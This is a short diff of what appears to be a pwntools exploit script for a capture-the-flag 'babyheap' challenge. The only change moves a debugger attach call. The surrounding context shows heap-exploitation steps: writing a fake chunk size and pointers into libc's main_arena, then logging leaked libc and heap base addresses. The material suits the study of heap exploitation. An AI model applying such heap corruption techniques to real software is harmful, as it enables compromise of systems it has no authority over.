@@ -3,7 +3,6 @@ context(log_level='debug')
 DEBUG=1
 if DEBUG:
 	p=process('./babyheap')#,env={"LD_PRELOAD":"./libc-2.24.so"},aslr=False)
-	gdb.attach(p)
 	# p.interactive()
 else:
 	p=remote()
@@ -80,6 +79,7 @@ def main():
 	update(1,0x30,p64(0)*3+p64(0x51)+p64(libcbase+main_arena+0x25)*2)
 	
 	
+	gdb.attach(p)
 	alloc(0x48)
 	alloc(0x48)
 	log.success('libcbase: 0x%x heapbase: 0x%x'%(libcbase,heapbase))
